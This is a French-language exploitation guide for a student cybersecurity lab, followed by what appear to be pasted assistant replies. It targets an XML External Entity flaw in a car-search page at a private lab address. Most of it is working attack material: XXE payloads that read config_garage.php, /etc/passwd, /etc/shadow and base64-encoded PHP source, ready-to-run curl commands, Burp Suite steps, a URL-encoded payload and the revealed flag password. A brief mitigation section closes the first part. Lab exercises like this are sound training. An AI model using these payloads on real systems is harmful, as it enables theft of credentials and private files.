===============================================
   GUIDE D'EXPLOITATION - XXE ATTACK
   SAE Cybers√©curit√© - Alois
===============================================

OBJECTIF : R√©cup√©rer le fichier config_garage.php qui contient
le FLAG (mot de passe de la base de donn√©es en dur)

FLAG : S3cr3t_G4r4g3_P@ss2024!

===============================================
1. PRINCIPE DE L'ATTAQUE XXE
===============================================

XXE = XML External Entity Injection

La page "Recherche Avanc√©e" envoie les filtres au serveur via XML.
Le parseur XML accepte les entit√©s externes (LIBXML_NOENT).
On peut donc injecter une entit√© qui lit un fichier local.

===============================================
2. EXPLOITATION
===============================================

Au lieu d'envoyer le XML normal :

<?xml version="1.0" encoding="UTF-8"?>
<recherche>
  <filtre>
    <marque>Peugeot</marque>
    ...
  </filtre>
</recherche>

Envoyer ce payload malveillant :

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///var/www/html/sae-cyber/includes/config_garage.php">
]>
<recherche>
  <filtre>
    <marque>&xxe;</marque>
    <type></type>
    <prix_max></prix_max>
    <region></region>
  </filtre>
</recherche>

===============================================
3. EXPLOITATION AVEC CURL
===============================================

curl -X POST http://192.168.49.24/sae-cyber/index.php?page=recherche_avancee \
  -d 'filters=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/sae-cyber/includes/config_garage.php">]><recherche><filtre><marque>&xxe;</marque><type></type><prix_max></prix_max><region></region></filtre></recherche>'

===============================================
4. EXPLOITATION VIA BURP SUITE
===============================================

1. Intercepter la requ√™te POST de la recherche
2. Modifier le param√®tre "filters" avec le payload XXE
3. Le contenu du fichier appara√Ætra dans la r√©ponse

===============================================
5. LIRE D'AUTRES FICHIERS
===============================================

/etc/passwd :
<!ENTITY xxe SYSTEM "file:///etc/passwd">

/etc/shadow (si permissions) :
<!ENTITY xxe SYSTEM "file:///etc/shadow">

Code source PHP :
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/sae-cyber/includes/db_connect.php">

===============================================
6. MESURES DE PROTECTION
===============================================

1. D√©sactiver le chargement des entit√©s externes :
   libxml_disable_entity_loader(true);

2. Utiliser LIBXML_NOENT avec pr√©caution ou l'√©viter

3. Valider/sanitizer le XML avant parsing

4. Ne pas stocker de mots de passe en clair dans les fichiers




--------------------

oici le guide √©tape par √©tape pour tester l'exploit XXE :

√âtape 1 : V√©rifier que le site fonctionne
Sur la VM attaquante, ouvre un navigateur et va sur :

http://192.168.49.24/sae-cyber/index.php?page=recherche_avancee
Tu dois voir la page "Recherche Avanc√©e de V√©hicules" avec les filtres.

√âtape 2 : Tester une recherche normale
S√©lectionne une marque (ex: Peugeot)
Clique sur "Rechercher"
Tu verras le XML envoy√© en bas de page et les r√©sultats
√âtape 3 : Intercepter avec Burp Suite (m√©thode recommand√©e)
Lance Burp Suite sur la VM attaquante
Configure ton navigateur pour utiliser le proxy 127.0.0.1:8080
Va sur la page Recherche Avanc√©e
Fais une recherche normale
Dans Burp ‚Üí Proxy ‚Üí HTTP History, trouve la requ√™te POST
Clic droit ‚Üí Send to Repeater
√âtape 4 : Injecter le payload XXE
Dans Burp Repeater, remplace le param√®tre filters=... par :

filters=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/sae-cyber/includes/config_garage.php">]><recherche><filtre><marque>&xxe;</marque><type></type><prix_max></prix_max><region></region></filtre></recherche>
Clique sur Send.

√âtape 5 : Alternative avec curl (sans Burp)
Sur la VM attaquante, ouvre un terminal et ex√©cute :

bash
curl -X POST "http://192.168.49.24/sae-cyber/index.php?page=recherche_avancee" \
  --data-urlencode 'filters=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/sae-cyber/includes/config_garage.php">]><recherche><filtre><marque>&xxe;</marque><type></type><prix_max></prix_max><region></region></filtre></recherche>'
√âtape 6 : Lire le r√©sultat
Dans la r√©ponse, cherche dans le tableau des r√©sultats. La colonne "Marque" affichera le contenu du fichier config_garage.php :

<?php
// includes/config_garage.php
...
$garage_api_password = 'S3cr3t_G4r4g3_P@ss2024!';
...
üéØ FLAG trouv√© : S3cr3t_G4r4g3_P@ss2024!

Bonus : Lire /etc/passwd
bash
curl -X POST "http://192.168.49.24/sae-cyber/index.php?page=recherche_avancee" \
  --data-urlencode 'filters=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><recherche><filtre><marque>&xxe;</marque><type></type><prix_max></prix_max><region></region></filtre></recherche>'
Tu verras la liste des utilisateurs du syst√®me ! üîì

filters=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/sae-cyber/includes/config_garage.php">]><recherche><filtre><marque>&xxe;</marque><type></type><prix_max></prix_max><region></region></filtre></recherche>
Assurez-vous de v√©rifier ces points dans la requ√™te compl√®te :

M√©thode : POST
URL : /sae-cyber/index.php?page=recherche_avancee (ou juste /index.php?page=recherche_avancee selon votre configuration Burp)
Content-Type : application/x-www-form-urlencoded
Body : Collez le payload ci-dessus.
Si vous voulez voir le r√©sultat d√©cod√© facilement, regardez la r√©ponse HTML, cherchez la balise <table> ou la colonne "Marque", le contenu du fichier 
config_garage.php
 (et donc le flag) s'y trouvera.



 Voici la version encod√©e et la commande √©quivalente.

1. Pour Burp Suite (Version Encod√©e)
Copiez-collez ceci comme valeur pour le param√®tre filters= :

text
%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fsae-cyber%2Fincludes%2Fconfig_garage.php%22%3E%5D%3E%3Crecherche%3E%3Cfiltre%3E%3Cmarque%3E%26xxe%3B%3C%2Fmarque%3E%3Ctype%3E%3C%2Ftype%3E%3Cprix_max%3E%3C%2Fprix_max%3E%3Cregion%3E%3C%2Fregion%3E%3C%2Ffiltre%3E%3C%2Frecherche%3E
2. En ligne de commande (avec curl)
Oui, c'est m√™me plus simple car curl g√®re l'encodage pour vous avec l'option --data-urlencode. Lancez cette commande dans votre terminal :

bash
curl -X POST "http://localhost/sae-cyber/index.php?page=recherche_avancee" \
  --data-urlencode 'filters=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/sae-cyber/includes/config_garage.php">]><recherche><filtre><marque>&xxe;</marque><type></type><prix_max></prix_max><region></region></filtre></recherche>'